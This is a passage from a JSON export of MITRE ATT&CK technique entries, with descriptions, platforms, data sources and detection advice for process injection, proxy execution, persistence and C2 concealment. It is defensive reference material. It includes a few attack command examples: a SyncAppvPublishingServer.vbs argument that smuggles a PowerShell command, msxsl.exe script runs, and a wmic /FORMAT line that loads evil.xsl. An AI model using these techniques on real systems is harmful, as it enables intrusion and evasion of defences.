Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1105",
      "stix_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
      "created": "2017-05-31T21:31:16.408000+00:00",
      "modified": "2025-04-15T19:59:17.217000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1216.002": {
      "id": "T1216.002",
      "name": "SyncAppvPublishingServer",
      "description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by \"living off the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)\n\nFor example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1216.002",
      "stix_id": "attack-pattern--e6f19759-dde3-47fc-99cc-d9f5fa4ade60",
      "created": "2024-02-06T16:20:41.647000+00:00",
      "modified": "2025-04-15T23:13:55.573000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1098.002": {
      "id": "T1098.002",
      "name": "Additional Email Delegate Permissions",
      "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.002",
      "stix_id": "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306",
      "created": "2020-01-19T16:54:28.516000+00:00",
      "modified": "2025-04-15T21:47:23.761000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Group: Group Modification",
        "Application Log: Application Log Content",
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\nEnable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. \n\nA larger than normal volume of emails sent from an account and similar phishing emails sent from \u202freal accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring."
    },
    "T1588.003": {
      "id": "T1588.003",
      "name": "Code Signing Certificates",
      "description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.003",
      "stix_id": "attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15",
      "created": "2020-10-01T02:11:47.237000+00:00",
      "modified": "2025-04-15T22:05:19.685000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)."
    },
    "T1648": {
      "id": "T1648",
      "name": "Serverless Execution",
      "description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation: OWN-CERT Google App Script 2024)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1648",
      "stix_id": "attack-pattern--e848506b-8484-4410-8017-3d235a52f5b3",
      "created": "2022-05-27T13:19:51.112000+00:00",
      "modified": "2025-04-15T19:59:17.861000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1548.006": {
      "id": "T1548.006",
      "name": "TCC Manipulation",
      "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)\n\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.006",
      "stix_id": "attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb",
      "created": "2024-03-21T21:10:57.322000+00:00",
      "modified": "2025-04-15T23:14:58.393000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1055.008": {
      "id": "T1055.008",
      "name": "Ptrace System Calls",
      "description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.008",
      "stix_id": "attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f",
      "created": "2020-01-14T01:33:19.065000+00:00",
      "modified": "2025-04-25T14:48:25.896000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Access",
        "Process: Process Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1653": {
      "id": "T1653",
      "name": "Power Settings",
      "description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)\n\nFor example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1653",
      "stix_id": "attack-pattern--ea071aa0-8f17-416f-ab0d-2bab7e79003d",
      "created": "2023-06-05T15:52:52.467000+00:00",
      "modified": "2025-04-15T19:59:18.299000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Command-line invocation of tools capable of modifying services may be unusual and can be monitored for and alerted on, depending on how systems are typically used in a particular environment. \n"
    },
    "T1027.007": {
      "id": "T1027.007",
      "name": "Dynamic API Resolution",
      "description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.007",
      "stix_id": "attack-pattern--ea4c2f9c-9df1-477c-8c42-6da1118f2ac4",
      "created": "2022-08-22T20:42:08.498000+00:00",
      "modified": "2025-04-15T22:24:25.266000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "File: File Metadata",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1021.001": {
      "id": "T1021.001",
      "name": "Remote Desktop Protocol",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.001",
      "stix_id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf",
      "created": "2020-02-11T18:23:26.059000+00:00",
      "modified": "2025-04-15T19:59:18.689000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Logon Session: Logon Session Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time."
    },
    "T1037.001": {
      "id": "T1037.001",
      "name": "Logon Script (Windows)",
      "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037.001",
      "stix_id": "attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3",
      "created": "2020-01-10T03:43:37.211000+00:00",
      "modified": "2025-04-15T22:46:59.108000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript</code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon."
    },
    "T1055.015": {
      "id": "T1055.015",
      "name": "ListPlanting",
      "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.(Citation: Hexacorn Listplanting) Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.015",
      "stix_id": "attack-pattern--eb2cb5cb-ae87-4de0-8c35-da2a17aafb99",
      "created": "2021-11-22T15:02:15.190000+00:00",
      "modified": "2025-04-15T19:59:18.862000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Modification",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. \n\nConsider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.\n\nAnalyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1665": {
      "id": "T1665",
      "name": "Hide Infrastructure",
      "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\n\nC2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies)\n\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite)\n\nHiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1665",
      "stix_id": "attack-pattern--eb897572-8979-4242-a089-56f294f4c91d",
      "created": "2024-02-13T17:00:00.175000+00:00",
      "modified": "2025-04-15T19:59:18.948000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Metadata",
        "Network Traffic: Network Traffic Content",
        "Domain Name: Domain Registration",
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1484": {
      "id": "T1484",
      "name": "Domain or Tenant Policy Modification",
      "description": "Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)\n* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)\n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1484",
      "stix_id": "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
      "created": "2019-03-07T14:10:32.650000+00:00",
      "modified": "2025-04-15T19:59:19.033000+00:00",
      "platforms": [
        "Windows",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Deletion",
        "Active Directory: Active Directory Object Creation",
        "Command: Command Execution",
        "Active Directory: Active Directory Object Modification",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)(Citation: Microsoft 365 Defender Solorigate) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)\n\nConsider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings.(Citation: Microsoft - Update or Repair Federated domain) Some domain policy modifications, such as changes to federation settings, are likely to be rare.(Citation: Microsoft 365 Defender Solorigate)"
    },
    "T1220": {
      "id": "T1220",
      "name": "XSL Script Processing",
      "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get 